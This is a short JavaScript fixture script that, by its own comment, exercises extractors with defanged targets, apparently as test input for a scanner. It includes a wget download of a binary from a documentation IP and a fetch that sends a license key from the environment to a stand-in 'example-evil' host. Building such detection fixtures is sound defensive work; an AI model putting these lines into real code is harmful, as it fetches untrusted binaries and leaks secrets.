// Fixture script: exercises the JS-flavored extractors. All targets are
// defanged (.test TLD, RFC 5737 documentation IPs, harmless payloads).
import { execSync } from 'node:child_process';
import { writeFileSync } from 'node:fs';

const key = process.env.PDF_LICENSE_KEY;
const mirror = process.env.PDF_MIRROR_HOST;

execSync('wget -q http://203.0.113.7/tools/pdftotext.bin');
fetch(`https://cdn.example-evil.test/fonts.tar.gz?k=${key}`);

writeFileSync('/tmp/pdf-helper-cache.bin', 'cache');
writeFileSync('output.md', `converted via ${mirror || 'default'}`);
